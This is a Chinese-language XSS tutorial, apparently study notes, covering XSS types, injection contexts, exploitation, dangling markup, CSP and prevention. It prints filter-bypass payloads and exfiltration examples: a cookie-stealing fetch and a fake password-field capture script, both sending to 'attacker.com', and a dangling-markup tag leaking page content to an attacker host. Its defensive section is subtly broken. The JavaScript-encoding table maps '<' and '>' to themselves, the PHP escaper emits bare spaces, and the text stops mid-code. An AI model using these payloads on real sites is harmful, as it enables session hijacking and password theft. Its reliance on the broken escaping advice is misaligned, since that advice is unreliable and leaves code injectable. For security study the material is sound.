# Cross-Site Scripting (XSS)

> **参考：** [CSRF](../Cross-site%20request%20forgery%20(CSRF)/Cross-site%20request%20forgery%20(CSRF).md) | [JavaScript for XSS](./JavaScript%20for%20XSS/JavaScript%20for%20XSS.md) | [DOM and Browser](./DOM%20and%20Browser/DOM%20and%20Browser.md) | [XSS Payloads](./XSS%20Payloads/XSS%20Payloads.md) | [Content Security Policy](./Content%20Security%20Policy/Content%20Security%20Policy.md) | [XSS Prevention](./XSS%20Prevention/XSS%20Prevention.md)

---

## 什么是 XSS？

跨站脚本（Cross-Site Scripting，简称 XSS）是一种 Web 安全漏洞，允许攻击者破坏用户与存在漏洞的应用程序之间的交互。它使攻击者能够绕过同源策略（Same Origin Policy），该策略旨在将不同网站彼此隔离。XSS 漏洞通常允许攻击者伪装成受害用户，执行该用户能够执行的任何操作，并访问该用户的任何数据。如果受害用户在应用程序中具有特权访问权限，攻击者可能能够完全控制应用程序的所有功能和数据。

> **Same Origin Policy 回顾：** "源"由**协议（Protocol）**、**域名（Host）**和**端口（Port）**三部分组成。只有当这三者完全一致时，才叫同源。XSS 攻击的核心在于：攻击者将恶意脚本注入到可信网站的页面中，使得浏览器认为该脚本来自可信源，从而绕过同源策略的限制。

### XSS 的工作原理

XSS 通过操纵存在漏洞的网站，使其向用户返回恶意 JavaScript 来工作。当恶意代码在受害者浏览器中执行时，攻击者可以完全破坏其与应用程序的交互。

核心流程：

1. 攻击者发现应用程序中存在一个注入点，允许将恶意数据嵌入响应中
2. 攻击者构造包含恶意 JavaScript 的 payload
3. 受害者访问包含 payload 的页面（直接访问恶意 URL，或访问存储了恶意内容的页面）
4. 浏览器解析响应，执行注入的 JavaScript
5. 恶意脚本在受害者的会话上下文中运行，可以读取数据、发出请求、修改页面

### XSS 概念验证（Proof of Concept）

确认大多数类型的 XSS 漏洞，可以通过注入一个 payload 使浏览器执行任意 JavaScript。长期以来，`alert()` 函数一直用于此目的，因为它简短、无害且成功调用时非常明显。

**Chrome 的限制：** 从 Chrome 92 版本（2021 年 7 月 20 日）开始，跨源 iframe 被阻止调用 `alert()`。由于跨源 iframe 用于构造一些更高级的 XSS 攻击，有时需要使用替代 PoC payload。在这种场景下，推荐使用 `print()` 函数。

### XSS 攻击的三种类型

| 类型 | 恶意脚本来源 | 数据存储位置 | 触发方式 |
|------|------------|------------|---------|
| **反射型 XSS** (Reflected XSS) | 当前 HTTP 请求 | 不存储，在响应中即时反射 | 受害者点击恶意链接 |
| **存储型 XSS** (Stored XSS) | 网站数据库 | 服务器端（数据库、文件系统等） | 受害者访问包含恶意内容的正常页面 |
| **DOM 型 XSS** (DOM-based XSS) | 客户端代码而非服务器端代码 | 不经过服务器，仅存在于客户端 | JavaScript 不安全地处理用户可控数据并写入 DOM |

---

## 反射型 XSS

### 什么是反射型 XSS？

反射型 XSS（Reflected Cross-Site Scripting）是最简单的跨站脚本类型。当应用程序接收 HTTP 请求中的数据，并以不安全的方式将该数据包含在即时响应中时，就会出现此漏洞。

假设一个网站有一个搜索功能，通过 URL 参数接收用户提供的搜索词：

```
https://insecure-website.com/search?term=gift
```

应用程序将提供的搜索词回显在响应中：

```html
<p>You searched for: gift</p>
```

假设应用程序不对数据执行任何其他处理，攻击者可以构造如下攻击：

```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```

此 URL 产生以下响应：

```html
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

如果应用程序的另一用户请求攻击者的 URL，则攻击者提供的脚本将在受害用户浏览器中执行，在其与应用程序的会话上下文中运行。

### 反射型 XSS 攻击的影响

如果攻击者能够控制在受害者浏览器中执行的脚本，通常可以完全攻陷该用户。攻击者可以：

- 执行用户能够在应用程序中执行的任何操作
- 查看用户能够查看的任何信息
- 修改用户能够修改的任何信息
- 发起与其他应用程序用户的交互，包括恶意攻击，这些攻击看似来自最初的受害用户

攻击者诱导受害者发出其控制的请求的方式包括：

- 在攻击者控制的网站上放置链接
- 在允许生成内容的其他网站上放置链接
- 通过电子邮件、推文或其他消息发送链接

攻击可以针对已知用户进行定向攻击，也可以是对应用程序任意用户的无差别攻击。由于需要外部交付机制，反射型 XSS 的影响通常比存储型 XSS 小。

### 如何查找和测试反射型 XSS 漏洞

手动测试反射型 XSS 漏洞的步骤：

| 步骤 | 操作 | 说明 |
|------|------|------|
| **1. 测试每个入口点** | 分别测试应用程序 HTTP 请求中的每个数据入口点 | 包括 URL 查询字符串和消息体中的参数或数据、URL 文件路径，以及 HTTP 头（通过某些 HTTP 头触发的 XSS 行为在实践中可能无法利用） |
| **2. 提交随机字母数字值** | 为每个入口点提交唯一的随机值，确定该值是否在响应中被反射 | 值应足够短且仅包含字母数字字符，以通过大多数输入验证。约 8 个字符的随机字母数字值通常是最理想的 |
| **3. 确定反射上下文** | 对于响应中反射随机值的每个位置，确定其上下文 | 可能是 HTML 标签之间的文本、带引号的标签属性内、JavaScript 字符串内等 |
| **4. 测试候选 payload** | 基于反射上下文，测试初始候选 XSS payload | 如果 payload 在响应中原样反射，将触发 JavaScript 执行 |
| **5. 测试替代 payload** | 如果候选 payload 被修改或阻止，测试替代 payload 和技术 | 基于反射上下文和正在执行的输入验证类型 |
| **6. 在浏览器中测试攻击** | 如果找到在工具中似乎有效的 payload，在真实浏览器中验证 | 执行 `alert(document.domain)` 来确认攻击成功 |

---

## 存储型 XSS

### 什么是存储型 XSS？

存储型 XSS（Stored XSS，也称为持久型或二阶 XSS）发生在应用程序接收来自不受信任源的数据，并以不安全的方式将该数据包含在后续 HTTP 响应中时。

假设一个网站允许用户在博客文章上提交评论，评论会显示给其他用户。用户使用如下 HTTP 请求提交评论：

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

提交此评论后，任何访问该博客文章的用户将在应用程序的响应中收到：

```html
<p>This post was extremely helpful.</p>
```

假设应用程序不对数据执行任何其他处理，攻击者可以提交如下恶意评论：

```html
<script>/* Bad stuff here... */</script>
```

在攻击者的请求中，此评论将被 URL 编码为：

```
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

任何访问该博客文章的用户现在将收到：

```html
<p><script>/* Bad stuff here... */</script></p>
```

攻击者提供的脚本将在受害用户浏览器中执行，在其与应用程序的会话上下文中运行。

### 存储型 XSS 攻击的影响

存储型 XSS 与反射型 XSS 在可利用性方面的关键区别在于：**存储型 XSS 漏洞使攻击能够在应用程序内部自包含**。攻击者不需要找到外部方式来诱导其他用户发出包含其攻击 payload 的特定请求。相反，攻击者将其攻击 payload 放入应用程序本身，只需等待用户遇到它。

存储型 XSS 的自包含特性在以下场景中尤为重要：XSS 漏洞仅影响当前登录应用程序的用户。如果 XSS 是反射型的，攻击必须是机会性的——用户在未登录时被诱导发出攻击者请求将不会受到威胁。而如果 XSS 是存储型的，用户遇到攻击 payload 时**保证已登录**。

### 如何查找和测试存储型 XSS 漏洞

测试存储型 XSS 漏洞的关键是定位**入口点**和**出口点**之间的链接：

**入口点**（数据进入应用程序处理的位置）：

- URL 查询字符串和消息体中的参数或数据
- URL 文件路径
- HTTP 请求头（可能无法通过反射型 XSS 利用）
- 任何带外路径：Webmail 应用程序处理邮件中的数据；Twitter 源应用程序处理第三方推文中的数据；新闻聚合器包含来自其他网站的数据

**出口点**（数据可能出现在应用程序响应中的位置）：

- 在**任何情况下**返回给**任何类型**应用程序用户的**所有可能的 HTTP 响应**

**实践方法：** 系统性地遍历数据入口点，向每个入口点提交特定值，并监控应用程序的响应以检测提交值出现的位置。特别注意相关的应用程序功能，如博客文章评论。当在响应中观察到提交值时，需要确定数据是否确实跨不同请求存储，而不是在即时响应中被简单反射。

测试方法与反射型 XSS 基本相同：确定存储数据出现的响应上下文，测试适用于该上下文的候选 XSS payload。

### 反射型 XSS 与存储型 XSS 对比

| 维度 | 反射型 XSS | 存储型 XSS |
|------|----------|----------|
| **触发方式** | 受害者点击恶意链接 | 受害者访问正常页面即可触发 |
| **持久性** | 不持久，仅存在于单次请求-响应中 | 数据存储在服务器端，持续影响所有访问者 |
| **攻击范围** | 一对一的定向攻击或一对多的钓鱼攻击 | 一对多，自动影响所有访问受影响页面的用户 |
| **利用难度** | 需要社会工程学交付恶意 URL | 只需将 payload 提交到应用程序即可 |
| **严重性** | 通常较低（需要受害者主动操作） | 通常较高（自包含，无需外部交付机制） |

---

## DOM 型 XSS

### 什么是 DOM 型 XSS？

DOM 型 XSS（DOM-based Cross-Site Scripting）发生在应用程序包含一些客户端 JavaScript，以不安全的方式处理来自不受信任源的数据时，通常是将数据写回 DOM。

在以下示例中，应用程序使用 JavaScript 从输入字段读取值并将其写入 HTML 元素：

```javascript
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

如果攻击者能够控制输入字段的值，可以轻松构造恶意值使其脚本执行：

```html
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```

在典型情况下，输入字段将从 HTTP 请求的一部分（如 URL 查询字符串参数）填充，允许攻击者使用恶意 URL 交付攻击，方式与反射型 XSS 相同。

### DOM XSS 的核心概念：Sources 与 Sinks

要交付 DOM 型 XSS 攻击，需要将数据放入 **source（源）**，使其传播到 **sink（汇）** 并导致任意 JavaScript 的执行。

**最常用的 source 是 URL**，通常通过 `window.location` 对象访问。攻击者可以构造一个链接，将 payload 放入 URL 的查询字符串和片段部分，发送受害者到存在漏洞的页面。在某些情况下（如针对 404 页面或运行 PHP 的网站），payload 也可以放在路径中。

### 测试 HTML Sinks

对于 HTML sink 中的 DOM XSS：

1. 将随机字母数字字符串放入 source（如 `location.search`）
2. 使用开发者工具检查 HTML，找到字符串出现的位置（注意：浏览器的"查看源代码"选项不适用于 DOM XSS 测试，因为它不考虑 JavaScript 对 HTML 的修改）
3. 对于字符串在 DOM 中出现的每个位置，确定上下文
4. 基于上下文，细化输入以查看其处理方式（如字符串出现在双引号属性中，尝试注入双引号以查看是否能脱离属性）

**浏览器差异：** Chrome、Firefox 和 Safari 会 URL 编码 `location.search` 和 `location.hash`，而 IE11 和 Microsoft Edge（Chromium 之前）不会对这些 source 进行 URL 编码。如果数据在 processing 之前被 URL 编码，XSS 攻击不太可能成功。

### 测试 JavaScript 执行 Sinks

1. 对于每个潜在 source，首先在页面 JavaScript 代码中查找 source 被引用的位置（Chrome DevTools 中可使用 Control+Shift+F 搜索所有 JavaScript 代码）
2. 使用 JavaScript 调试器添加断点，追踪 source 的值如何被使用
3. source 可能被赋值给其他变量，需要继续追踪这些变量
4. 当找到接收源自 source 的数据的 sink 时，使用调试器检查值
5. 细化输入以查看是否能够交付成功的 XSS 攻击

### 不同 Source 和 Sink 的利用

#### document.write Sink

`document.write` sink 可用于注入 `<script>` 元素：

```javascript
document.write('... <script>alert(document.domain)</script> ...');
```

注意：在某些情况下，写入 `document.write` 的内容包含周围上下文，需要在利用中予以处理（如先闭合一些现有元素）。

#### innerHTML Sink

`innerHTML` sink 在任何现代浏览器上**不接受 `script` 元素**，`svg onload` 事件也不会触发。需要使用替代元素如 `img` 或 `iframe`，配合 `onload` 和 `onerror` 等事件处理器：

```javascript
element.innerHTML = '... <img src=1 onerror=alert(document.domain)> ...';
```

### jQuery 中的 DOM XSS

如果使用了 jQuery 等 JavaScript 库，需要注意可以改变页面上 DOM 元素的 sink。

#### attr() 函数

如果数据从用户可控的 source（如 URL）读取并传递给 `attr()` 函数，可能可以操纵发送的值导致 XSS：

```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

通过修改 URL 使 `location.search` source 包含恶意的 JavaScript URL：

```
?returnUrl=javascript:alert(document.domain)
```

#### $() 选择器函数

jQuery 的 `$()` 选择器函数可能被用于向 DOM 注入恶意对象。经典的 DOM XSS 漏洞是由网站将此选择器与 `location.hash` source 结合使用，用于动画或自动滚动到页面上的特定元素：

```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

由于 hash 是用户可控的，攻击者可以使用此漏洞将 XSS 向量注入 `$()` 选择器 sink。更新版本的 jQuery 已修补此特定漏洞，阻止在以 `#` 开头时将 HTML 注入选择器。

**触发 hashchange 事件：** 最简单的交付利用方式是通过 iframe：

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

**注意：** 即使是较新版本的 jQuery，如果完全控制其来自不需要 `#` 前缀的 source 的输入，仍可能通过 `$()` 选择器 sink 存在漏洞。

### AngularJS 中的 DOM XSS

如果使用了 AngularJS 等框架，可能无需尖括号或事件即可执行 JavaScript。当站点在 HTML 元素上使用 `ng-app` 属性时，AngularJS 将处理该元素。在这种情况下，AngularJS 将执行双大括号内的 JavaScript，这些双大括号可以直接出现在 HTML 中或属性内。

### DOM XSS 与反射型/存储型的组合

#### 反射型 DOM XSS

服务器处理请求中的数据，并将数据回显到响应中。反射的数据可能被放入 JavaScript 字符串字面量或 DOM 中的数据项（如表单字段）。页面上的脚本然后以不安全的方式处理反射的数据，最终将其写入危险的 sink：

```javascript
eval('var data = "reflected string"');
```

#### 存储型 DOM XSS

服务器从一个请求接收数据，存储它，然后在后续响应中包含该数据。后续响应中的脚本包含一个 sink，以不安全的方式处理该数据：

```javascript
element.innerHTML = comment.author;
```

### 导致 DOM-XSS 漏洞的主要 Sinks

**JavaScript Sinks：**

| Sink | 说明 |
|------|------|
| `document.write()` | 向文档写入 HTML，可注入 script 标签 |
| `document.writeln()` | 同 write()，追加换行 |
| `element.innerHTML` | 设置元素的 HTML 内容，不接受 script 但接受事件处理器 |
| `element.outerHTML` | 替换整个元素，风险同 innerHTML |
| `element.insertAdjacentHTML` | 在指定位置插入 HTML |
| `element.onevent` | 直接赋值事件处理器（如 `element.onclick = userInput`） |
| `eval()` | 执行任意 JavaScript 字符串 |
| `setTimeout()` / `setInterval()` | 第一个参数为字符串时作为代码执行 |
| `new Function()` | 从字符串创建可执行函数 |
| `location.href` / `location.replace()` | 导航到 `javascript:` URL 时执行代码 |
| `document.cookie` | 在某些情况下可被用于 session fixation |

**jQuery Sinks：**

| Sink | 风险 |
|------|------|
| `$()` | 如果输入以 `<` 开头，可创建新的 DOM 元素 |
| `html()` / `append()` / `prepend()` | 设置 HTML 内容，类似 innerHTML |
| `after()` / `before()` | 在元素前后插入 HTML |
| `replaceAll()` / `replaceWith()` | 替换元素为 HTML |
| `wrap()` / `wrapInner()` / `wrapAll()` | 包裹元素 |
| `attr()` / `prop()` | 修改属性值，对 href/src 等属性危险 |
| `add()` / `has()` | 在某些条件下可被利用 |

---

## XSS 上下文

当测试反射型和存储型 XSS 时，关键任务是识别 XSS 上下文：
- 攻击者可控数据在响应中出现的位置
- 应用程序对该数据执行的任何输入验证或其他处理

基于这些细节，选择一个或多个候选 XSS payload 并测试其有效性。

### XSS 位于 HTML 标签之间

当 XSS 上下文为 HTML 标签之间的文本时，需要引入一些旨在触发 JavaScript 执行的新 HTML 标签。

常用方式：

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### XSS 位于 HTML 标签属性中

当 XSS 上下文在 HTML 标签属性值中时：

**方法一：终止属性值、闭合标签并引入新标签：**

```html
"><script>alert(document.domain)</script>
```

**方法二：在尖括号被阻止或编码的情况下，终止属性值并引入新的事件处理器属性：**

```html
" autofocus onfocus=alert(document.domain) x="
```

此 payload 创建 `onfocus` 事件，当元素获得焦点时执行 JavaScript，同时添加 `autofocus` 属性自动触发 `onfocus` 事件，最后添加 `x="` 修复后续标记。

**方法三：利用属性本身的脚本上下文（如 href 属性中的 javascript 伪协议）：**

```html
<a href="javascript:alert(document.domain)">
```

**方法四：利用 accesskey 属性 + 用户交互：**

即使在通常不会自动触发事件的标签（如 canonical 标签）中注入属性，也可以利用 access key 和 Chrome 上的用户交互来利用此行为。`accesskey` 属性允许定义键盘快捷键，当与其他键组合按下时将触发事件。

### XSS 进入 JavaScript

当 XSS 上下文在响应中已有的 JavaScript 中时，存在多种场景：

#### 终止现有脚本

最简单的情况是闭合包含现有 JavaScript 的 script 标签，并引入触发 JavaScript 执行的新 HTML 标签：

```html
<script>
...
var input = 'controllable data here';
...
</script>
```

Payload：

```html
</script><img src=1 onerror=alert(document.domain)>
```

**原理：** 浏览器首先执行 HTML 解析以识别页面元素（包括 script 块），然后才执行 JavaScript 解析以理解和执行嵌入的脚本。上述 payload 使原始脚本保持破坏状态（含有未终止的字符串字面量），但这不妨碍后续脚本以正常方式解析和执行。

#### 脱离 JavaScript 字符串

当 XSS 上下文位于带引号的字符串字面量中时，通常可以脱离字符串并直接执行 JavaScript。必须修复 XSS 上下文之后的脚本，因为其中的任何语法错误将阻止整个脚本执行。

脱离字符串字面量的常用方式：

```javascript
'-alert(document.domain)-'
';alert(document.domain)//
```

**反斜杠转义绕过：** 某些应用程序通过对单引号字符进行反斜杠转义来防止输入脱离 JavaScript 字符串。但应用程序经常犯一个错误：未能转义反斜杠字符本身。

例如，输入 `';alert(document.domain)//` 被转换为 `\';alert(document.domain)//`。使用替代 payload `\';alert(document.domain)//`，它被转换为 `\\';alert(document.domain)//`。第一个反斜杠意味着第二个反斜杠被解释为字面量，而非特殊字符。引号现在被解释为字符串终止符，攻击成功。

**无括号函数调用技术：** 某些网站通过限制可用字符使 XSS 更加困难。可以使用 `throw` 语句配合异常处理器，在不使用括号的情况下向函数传递参数：

```javascript
onerror=alert;throw 1
```

此代码将 `alert()` 函数赋值给全局异常处理器，`throw` 语句将 `1` 传递给异常处理器（即 `alert`）。最终结果是 `alert()` 函数以 `1` 作为参数被调用。

### 利用 HTML 编码绕过输入过滤

当 XSS 上下文在带引号的标签属性中的某个现有 JavaScript 内（如事件处理器）时，可以利用 HTML 编码来绕过某些输入过滤器。

当浏览器解析出响应中的 HTML 标签和属性后，会在进一步处理之前对标签属性值执行 HTML 解码。如果服务器端应用程序阻止或清理了成功 XSS 攻击所需的某些字符，通常可以通过对这些字符进行 HTML 编码来绕过输入验证。

例如，如果 XSS 上下文为：

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

且应用程序阻止或转义了单引号字符，可以使用以下 payload：

```
&apos;-alert(document.domain)-&apos;
```

`&apos;` 序列是表示撇号或单引号的 HTML 实体。由于浏览器在解释 JavaScript 之前对 `onclick` 属性的值进行 HTML 解码，实体被解码为引号，成为字符串分隔符，攻击成功。

### XSS 进入 JavaScript 模板字面量

JavaScript 模板字面量（Template Literals）是允许嵌入 JavaScript 表达式的字符串字面量。模板字面量用反引号而非普通引号包裹，嵌入表达式使用 `${...}` 语法标识。

```javascript
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

当 XSS 上下文在 JavaScript 模板字面量中时，无需终止字面量本身。只需使用 `${...}` 语法嵌入一个 JavaScript 表达式，该表达式将在字面量被处理时执行：

```javascript
${alert(document.domain)}
```

### XSS 通过客户端模板注入

某些网站使用客户端模板框架（如 AngularJS）动态渲染网页。如果它们以不安全的方式将用户输入嵌入这些模板中，攻击者可能能够注入其自己的恶意模板表达式，发起 XSS 攻击。

---

## 利用 XSS 漏洞

### 利用 XSS 窃取 Cookie

窃取 Cookie 是传统的 XSS 利用方式。大多数 Web 应用程序使用 Cookie 进行会话处理。可以利用 XSS 漏洞将受害者的 Cookie 发送到攻击者自己的域，然后手动将 Cookie 注入浏览器并冒充受害者。

**实践中的限制：**

| 限制 | 说明 |
|------|------|
| 受害者可能未登录 | 窃取的 Cookie 可能没有价值 |
| HttpOnly 标志 | 许多应用程序通过 HttpOnly 标志对 JavaScript 隐藏其 Cookie |
| 会话锁定 | 会话可能锁定到额外因素，如用户的 IP 地址 |
| 会话超时 | 会话可能在劫持之前超时 |

**示例 payload：**

```javascript
fetch('https://attacker.com/steal?c=' + document.cookie)
```

或使用 `new Image()` 避免 CORS 限制：

```javascript
new Image().src = 'https://attacker.com/steal?c=' + document.cookie
```

### 利用 XSS 捕获密码

如今许多用户拥有自动填充密码的密码管理器。可以利用以下方式：创建密码输入框，读取自动填充的密码，并将其发送到攻击者的域。此技术避免了窃取 Cookie 的大部分问题，甚至可能获取受害者重复使用相同密码的其他账户。

**示例 payload：**

```javascript
// 创建伪造的密码输入框
var passwordField = document.createElement('input');
passwordField.type = 'password';
passwordField.name = 'password';
passwordField.autocomplete = 'current-password';
document.body.appendChild(passwordField);

// 等待自动填充然后捕获
setTimeout(function() {
    fetch('https://attacker.com/steal?p=' + encodeURIComponent(passwordField.value));
}, 2000);
```

**缺点：** 此技术仅适用于具有执行密码自动填充的密码管理器的用户。

### 利用 XSS 绕过 CSRF 保护

XSS 使攻击者能够执行几乎任何合法用户可以在网站上执行的操作。通过在受害者浏览器中执行任意 JavaScript，XSS 允许以受害用户身份执行各种操作。

某些网站允许已登录用户在不重新输入密码的情况下更改其邮箱地址。如果在此类站点上发现 XSS 漏洞，可以利用它窃取 CSRF 令牌，然后更改受害者邮箱地址为攻击者控制的地址，最后触发密码重置以获取账户访问权限。

**这种利用类型将 XSS（窃取 CSRF 令牌）与 CSRF 通常针对的功能结合：**

| 维度 | 纯 CSRF | XSS + CSRF 混合攻击 |
|------|---------|-------------------|
| **通信方向** | 单向（攻击者诱导请求，看不到响应） | 双向（攻击者可发送请求并读取响应） |
| **CSRF 令牌防御** | 可有效防御普通 CSRF | XSS 可直接读取页面中的令牌值，完全绕过 |
| **攻击范围** | 单个操作的请求伪造 | 以受害者身份执行任意操作 |

> **关键洞察：** CSRF 令牌无法防御 XSS，因为 XSS 允许攻击者直接从响应中读取令牌值。

---

## 悬空标记注入（Dangling Markup Injection）

### 什么是悬空标记注入？

悬空标记注入是一种在无法进行完整 XSS 攻击的情况下跨域捕获数据的技术。

假设应用程序以不安全的方式将攻击者可控数据嵌入到其响应中：

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

假设应用程序不过滤或转义 `>` 或 `"` 字符。攻击者可以使用以下语法脱离带引号的属性值和闭合标签，返回到 HTML 上下文：

```
">
```

如果常规 XSS 攻击因输入过滤器、内容安全策略或其他障碍而不可行，仍然可能通过以下 payload 交付悬空标记注入攻击：

```
"><img src='//attacker-website.com?
```

此 payload 创建一个 `img` 标签并定义 `src` 属性的开头，其中包含攻击者服务器上的 URL。payload 未闭合 `src` 属性，使其"悬空"。当浏览器解析响应时，将向前查找直到遇到单引号来终止属性。直到该字符之前的所有内容将被视为 URL 的一部分，并通过 URL 查询字符串发送到攻击者服务器。

**攻击结果：** 攻击者可以捕获注入点之后应用程序响应的部分内容，其中可能包含敏感数据（CSRF 令牌、邮件消息、财务数据等）。

任何发出外部请求的属性都可以用于悬空标记攻击。

### 如何防御悬空标记注入

- 在输出时编码数据，与 XSS 防御相同
- 在输入到达时验证输入
- 使用 CSP 策略防止 `img` 等标签加载外部资源
- Chrome 浏览器已决定通过阻止 `img` 等标签定义包含原始字符（如尖括号和换行符）的 URL 来处理悬空标记攻击

---

## Content Security Policy（CSP）

### 什么是 CSP？

CSP（Content Security Policy，内容安全策略）是一种浏览器安全机制，旨在减轻 XSS 和其他攻击的影响。它通过限制页面可以加载的资源（如脚本和图像）以及限制页面是否可以被其他页面框架化来工作。

要启用 CSP，响应需要包含一个名为 `Content-Security-Policy` 的 HTTP 响应头，其值包含策略。策略本身由一个或多个指令组成，用分号分隔。

### 使用 CSP 减轻 XSS 攻击

**限制脚本来源：**

```
script-src 'self'
```

仅允许从与页面本身相同的源加载脚本。

```
script-src https://scripts.normal-website.com
```

仅允许从特定域加载脚本。

**注意：** 允许来自外部域的脚本时应谨慎。如果攻击者有任何控制从外部域提供的内容的方法，他们可能能够交付攻击。例如，不使用按客户划分 URL 的 CDN（如 `ajax.googleapis.com`）不应被信任，因为第三方可以将内容投递到其域上。

**Nonces 和 Hashes：**

| 机制 | 说明 | 安全要求 |
|------|------|---------|
| **Nonce（随机数）** | CSP 指令指定 nonce（随机值），加载脚本的标签中必须使用相同的值 | Nonce 必须在每次页面加载时安全生成且不可被攻击者猜测 |
| **Hash（哈希）** | CSP 指令指定受信任脚本内容的哈希 | 如果脚本内容发生变化，需要更新指令中指定的哈希值 |

**常见的 CSP 绕过：** 许多 CSP 阻止 `script` 等资源，但允许图像请求。这意味着通常可以使用 `img` 元素向外部服务器发出请求，例如泄露 CSRF 令牌。

某些策略更严格，阻止所有形式的外部请求。但仍然可以通过诱导用户交互来绕过这些限制——注入一个 HTML 元素，当点击时，将存储并发送注入元素所包裹的所有内容到外部服务器。

### 通过策略注入绕过 CSP

可能遇到将输入反射到实际策略中的网站，最可能是在 `report-uri` 指令中。如果站点反射可控参数，可以注入分号添加自己的 CSP 指令。通常 `report-uri` 是指令列表中的最后一条，这意味着需要覆盖现有指令以利用此漏洞并绕过策略。

**关键绕过：** Chrome 引入了 `script-src-elem` 指令，允许控制 `script` 元素但不控制事件。关键的是，此新指令允许覆盖现有的 `script-src` 指令。

### 使用 CSP 防御点击劫持

```
frame-ancestors 'self'
```

仅允许页面被来自相同源的页面框架化。

```
frame-ancestors 'none'
```

完全阻止框架化。

使用 CSP 防御点击劫持比使用 `X-Frame-Options` 头更灵活，因为可以指定多个域并使用通配符：

```
frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
```

CSP 还会验证父框架层级中的每个框架，而 `X-Frame-Options` 仅验证顶层框架。

---

## 如何防御 XSS

### 总体策略

防止跨站脚本漏洞通常涉及以下措施的组合：

| 防御层 | 策略 | 说明 |
|--------|------|------|
| **第一层：输出编码** | 在用户可控数据写入页面之前进行编码 | 根据写入的上下文（HTML、JavaScript、URL、CSS）选择正确的编码类型 |
| **第二层：输入验证** | 在接收用户输入时进行严格过滤 | 基于预期或有效的输入，使用白名单进行过滤 |
| **第三层：响应头** | 使用 `Content-Type` 和 `X-Content-Type-Options` 头 | 确保浏览器按预期方式解释响应 |
| **第四层：CSP** | 作为最后一道防线 | 减轻仍可能存在的 XSS 漏洞的严重性 |

### 在输出时编码数据

编码应在用户可控数据写入页面之前直接应用，因为写入的上下文决定了需要使用哪种编码。

**HTML 上下文：** 将非白名单值转换为 HTML 实体：

| 字符 | 编码为 |
|------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

**JavaScript 字符串上下文：** 对非字母数字值进行 Unicode 转义：

| 字符 | 编码为 |
|------|--------|
| `<` | `<` |
| `>` | `>` |

**多层编码：** 有时需要按正确顺序应用多层编码。例如，要将用户输入安全嵌入事件处理器中，需要同时处理 JavaScript 上下文和 HTML 上下文——首先进行 Unicode 转义，然后进行 HTML 编码：

```html
<a href="#" onclick="x='This string needs two layers of escaping'">test</a>
```

### 在输入到达时验证输入

编码可能是最重要的 XSS 防御线，但在每种上下文中防止 XSS 漏洞不够。应在首次从用户接收输入时尽可能严格地进行验证。

| 验证类型 | 示例 |
|----------|------|
| URL 验证 | 验证以安全协议（HTTP/HTTPS）开头，否则可能利用 `javascript:` 或 `data:` 等有害协议 |
| 数值验证 | 如果用户提供的值预期为数值，验证其包含整数 |
| 字符集验证 | 验证输入仅包含预期字符集 |

**白名单优于黑名单：** 与其列出所有有害协议（`javascript`、`data` 等），不如列出安全协议（HTTP、HTTPS）并禁止列表之外的任何内容。这将确保防御在出现新有害协议时不会失效，并降低受制于混淆无效值以逃避黑名单的攻击的敏感性。

### 允许"安全" HTML

应尽可能避免允许用户发布 HTML 标记，但有时这是业务需求。经典方法是尝试过滤掉具有潜在危害的标签和 JavaScript。

由于浏览器解析引擎的差异和 mutation XSS 等怪异行为，使用安全标签和属性的白名单实现这种方法极其困难。

**最低风险的选项：** 使用在用户浏览器中执行过滤和编码的 JavaScript 库，如 DOMPurify。其他库允许用户以 markdown 格式提供内容并将 markdown 转换为 HTML。但所有这些库都会不时出现 XSS 漏洞，因此需密切监控安全更新。

### PHP 中的 XSS 防御

**HTML 上下文：** 使用内置的 `htmlentities` 函数：

```php
<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8'); ?>
```

三个参数：
- 输入字符串
- `ENT_QUOTES`：指定所有引号应被编码
- 字符集：大多数情况下应为 UTF-8

**JavaScript 字符串上下文：** 需要对输入进行 Unicode 转义。PHP 不提供内建 API 来 Unicode 转义字符串，需要自行实现：

```php
<?php
function jsEscape($str) {
    $output = '';
    $str = str_split($str);
    for($i = 0; $i < count($str); $i++) {
        $chrNum = ord($str[$i]);
        $chr = $str[$i];
        if($chrNum === 226) {
            if(isset($str[$i+1]) && ord($str[$i+1]) === 128) {
                if(isset($str[$i+2]) && ord($str[$i+2]) === 168) {
                    $output .= ' ';
                    $i += 2;
                    continue;
                }
                if(isset($str[$i+2]) && ord($str[$i+2]) === 169) {
                    $output .= ' ';
                    $i += 2;
                    continue;
                }
            }
        }
        switch($chr) {
            case "'":
            case '"':
            case "\n";
            case "\r";
            case "&";
            case "\\";
            case "<":
            case ">":
                $output .= sprintf("\\u%04x", $chrNum);
            break;
            default:
                $output .= $str[$i];
            break;
        }
    }
    return $output;
}
?>
```

使用方式：

```php
<script>x = '<?php echo jsEscape($_GET['x'])?>';</script>
```

### JavaScript 客户端 XSS 防御

**HTML 上下文编码：**

```javascript
function htmlEncode(str) {
    return String(str).replace(/[^\w. ]/gi, function(c) {
        return '&#' + c.charCodeAt(0) + ';';
    });
}
```

使用：

```javascript
document.body.innerHTML = htmlEncode(untrustedValue);
```

**JavaScript 字符串 Unicode 编码：**

```javascript
function jsEscape(str) {
    return String(str).replace(/[^\w. ]/gi, function(c) {
        return '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4);
    });
}
```

使用：

```javascript
